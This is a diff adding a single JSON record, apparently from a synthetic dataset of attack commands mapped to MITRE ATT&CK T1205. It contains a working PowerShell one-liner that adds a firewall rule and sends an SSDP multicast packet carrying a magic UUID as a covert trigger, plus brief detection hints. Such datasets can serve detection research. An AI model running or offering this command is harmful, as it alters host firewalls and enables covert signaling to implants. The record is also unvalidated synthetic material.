@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall firewall add rule name='SSDP-Signal' dir=out action=allow protocol=UDP remoteport=1900 remoteip=239.255.255.250 >$null;$u=New-Object System.Net.Sockets.UdpClient;$data='M-SEARCH * HTTP/1.1`r`nHOST: 239.255.255.250:1900`r`nST: uuid:deadbeef-dead-beef-dead-beefdeadbeef`r`nMAN: \"ssdp:discover\"`r`nMX: 1`r`n`r`n';$bytes=[Text.Encoding]::ASCII.GetBytes($data);$u.Send($bytes,$bytes.Length,'239.255.255.250',1900)|Out-Null",
+  "explanation": "Transmits a multicast SSDP M-SEARCH request with a magic UUID in the ST header, enabling remote listeners to treat it as a covert trigger. Uses netsh to allow outbound UDP/1900 to the SSDP multicast address.",
+  "rationale_steps": [
+    "Craft a SSDP discovery message embedding a unique magic token in the ST field.",
+    "Allow and send multicast UDP/1900 traffic for signaling.",
+    "Detection: monitor outbound SSDP from servers, inspect unusual ST values, and detect netsh-created rules permitting multicast on non-UM H devices."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-00bead39",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
